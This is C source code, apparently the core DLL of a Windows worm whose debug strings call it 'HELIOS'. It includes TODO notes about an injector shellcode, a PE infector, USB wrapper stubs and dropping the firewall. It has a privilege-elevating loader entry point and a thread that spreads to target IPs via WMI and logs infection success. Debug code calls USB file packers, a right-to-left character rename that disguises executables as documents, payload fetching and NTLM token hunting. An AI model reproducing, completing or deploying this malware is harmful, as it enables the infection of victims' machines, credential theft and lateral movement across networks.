#include "main.h"

// Install Sleep() function in injector shellcode (otherwise 100% cpu usage if URLs fail)
// Infector has an issue with glass2k.exe
// Remember to hide the payload executable in the USB wrapper stub (probably not required)
// Fix gateway encryption in wrapper!!! <- it's all crypted anyway
// A bug in the "already infected" code in the wrapper subroutine
// Complete the chance of infection options inside the wrapper DLL
// Stuff to add for the documentation
//	Encrypt the campaign attack id (USER_CONFIGURATION strucure)
// Bug in the NtCreateThreadEx function (never calls) DO_NOT_USE_NTCREATETHREADEX
// fix the PE infector
// when the wrapper deletes files, it stores them in recycling bin (this doesn't seem certain)
// drop the local firewall for tftp
// Craft the scan_net() ICMP payload to mimic standard Windows pings

BOOL APIENTRY DllMain(	HANDLE	module,
						DWORD	reserved_call,
						LPVOID	reserved)
{
	return TRUE;
}

__declspec(dllexport) VOID _cdecl DrpOEP(LPVOID dll_raw)
{
	//BREAK;

	dropper_dll			= TRUE;

	LoadDll(dll_raw);
}

__declspec(dllexport) VOID _cdecl LoadDll(LPVOID dll_raw)
{

	// Do not zero anything, as functions memset haven't been resolved yet...

	ERROR_CODE				status;

	DWORD					local_pid;
	CHAR					event_name[1024];

	// Set the global raw dll
	dll_image = dll_raw;

	// Resolve our functions
	resolve_local_api32();

	//Sleep(INFINITE);

	// Initialize the debug interface
#ifdef DEBUG_OUT
	Sleep(1000);
	//BREAK;
	initialize_debug_channel();
	Sleep(1000);
	if (dropper_dll == TRUE) {
		//BREAK;
		DEBUG("+core32[%d]> First instance initialized.", GetCurrentProcessId());
	} else {
		DEBUG("+core32[%d]> DLL initialized.", GetCurrentProcessId());
	}
#endif

#ifdef NICE_DEBUG
	initialize_debug_channel();
	DEBUG("HELIOS> Loaded in remote memory.");
#endif

	// Debug
#ifdef ENTRY_DEBUG
	LoadDllDebug();
#endif

	// Elevate
	status = enable_debug_priv();
	if (status == FALSE) {
#ifdef DEBUG_OUT
		DEBUG("+core32[%d]> Failed to elevate!", GetCurrentProcessId());
#endif
		//FIXME
	}

	// Create our event instance
	local_pid = GetCurrentProcessId();
	ZeroMemory(event_name, sizeof(event_name));
	f_itoa(local_pid, event_name, 10);
	CreateEventA(NULL, TRUE, TRUE, (LPCSTR)event_name);

	// Start the thread dispatcher
	thread_dispatcher();

#ifdef DEBUG_OUT
	DEBUG("+core32[%d]> main() sleeping: SUCCESS!", GetCurrentProcessId());
#endif

	Sleep(INFINITE);

	return;
}

#ifdef ENTRY_DEBUG
VOID LoadDllDebug(VOID)
{
	PDWORD			exe;
	UINT			exe_size;
	CHAR			drive_letter[26]		= {0};
	WSADATA			wsadata					= {0};
	DWORD			pid_array[MAX_PIDS]		= {0};

	//WSAStartup(MAKEWORD(2,2), &wsadata);
	//scan_net();
	//find_ntlm_tokens(NULL);
	//find_pid("notepad.exe", pid_array);
	//enum_usb_files("C:\\Users\\devz\\Desktop\\test\\");

	//Sleep(INFINITE);

	ZeroMemory(&global_config, sizeof(global_config));
	global_config.wrapper_probability	= 100;
	global_config.gate_list_string		= GATE_LIST_TEST;
	global_config.gate_list_size		= string_length(GATE_LIST_TEST);
	//global_config.webdav_list_string	= WEBDAV_LIST_TEST;
	//global_config.webdav_list_size		= string_length(WEBDAV_LIST_TEST);
	global_config.attack_id				= 666;
	global_config.campaign_id			= 777;
	global_config.ignored_days = 20;
	global_config.wrapper				= TRUE;

	enum_usb_files("\\\\vmware-host\\Shared Folders\\test\\");

	ExitProcess(0);

	usb_file_packer(	"C:\\Users\\devz\\Desktop\\test\\pecoff_v8_binary_header.docx",
						FALSE,
						TRUE,
						TRUE,
						FALSE,
						FALSE,
						NULL,
						".pdf",
						NULL,
						GetModuleHandle(NULL));
	ExitProcess(0);
	Sleep(INFINITE);

	global_config.ignored_days = 20;
	enum_usb_files("C:\\Users\\x90\\System\\usb_samples\\");

	extract_user_config();
	//find_all_usb_drive_letters(drive_letter);

	//usb_file_packer("C:\\Users\\x90\\Desktop\\GSPQR.pdf");
	//read_raw_into_buffer("J:\\n0day2\\GSPQR.exe", &exe_size, &exe);
	//mutate_wrapper(exe, exe_size);

	//*(PDWORD)0 = 1;
	//append_date_filename("C:\\Users\\x90\\Desktop\\GSPQR.pdf");
	thread_webdav_enum();
	//usb_file_packer("C:\\Users\\x90\\Desktop\\test.docx");
	//rtl_character_rename("C:\\Users\\x90\\Desktop\\Winobj.exe", ".docx");
	//fetch_payload();
	//usb_file_injector("G:\\Dbgview.exe");
	
	//Sleep(INFINITE);
	//Sleep(INFINITE);
	//ExitProcess(0);

	return;
}
#endif

__declspec(dllexport) void __cdecl husk_entry_point()
{
	int				i;
	HANDLE			event_husk_ready;
	struct in_addr	ip_address;
	char			*target_ip;

	__nop;

	//BREAK;

	resolve_local_api32();

	// Setup the critical seg (sync between tftp and husk threads)
	ZeroMemory(&husk_tftp_sync, sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(&husk_tftp_sync);

	// Get our event handler
	event_husk_ready = OpenEventA(EVENT_ALL_ACCESS, TRUE, HUSK_READY_SIGNAL);

#ifdef DEBUG_OUT
	initialize_debug_channel();
	DEBUG("+husk> online.");
#endif

#ifdef NICE_DEBUG
	initialize_debug_channel();
	DEBUG("HELIOS> Impersonated process started");
#endif

	ResetEvent(event_husk_ready);

	while (TRUE) {
		Sleep(1000); //FIXME

		//DEBUG(">>> [husk] <<< Waiting on GO from [lsass]...");
		WaitForSingleObject(event_husk_ready, INFINITE);
		ResetEvent(event_husk_ready);
		
		// Get our ip address
		ip_address.S_un.S_addr = read_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME);
		target_ip = inet_ntoa(ip_address);

		// Do ops
		Sleep(1000);
#ifdef DEBUG_OUT
		DEBUG("+husk> GO signal received from [lsass]. Target: \t%s", target_ip);
#endif

#ifdef NICE_DEBUG
		DEBUG("HELIOS> Attacking %s", target_ip);
		if (!string_compare(target_ip, "10.0.0.39", string_length("10.0.0.39"))) {

			DEBUG("HELIOS> Failed.");

			create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_TRUE);

			SetEvent(event_husk_ready);

			Sleep(500);
			continue;
		}
#endif


		if (propagate_through_wmi(target_ip) == FALSE) {
#ifdef DEBUG_OUT
			DEBUG("!husk> Failed in communicating to remote namespace.");
#endif

#ifdef NICE_DEBUG
			DEBUG("HELIOS> Failed.");
			Sleep(5000);
#endif
			Sleep(500);
			create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_TRUE);

			SetEvent(event_husk_ready);
			Sleep(500);			
		} else {
			Sleep(500);
#ifdef DEBUG_OUT
			DEBUG("+husk> Infection was a SUCCESS!");
#endif


#ifdef NICE_DEBUG
			DEBUG("HELIOS> Success!");
#endif
			create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_FALSE);
			
			SetEvent(event_husk_ready);
			Sleep(500);			
		}

	}



	Sleep(INFINITE);

	return;
}

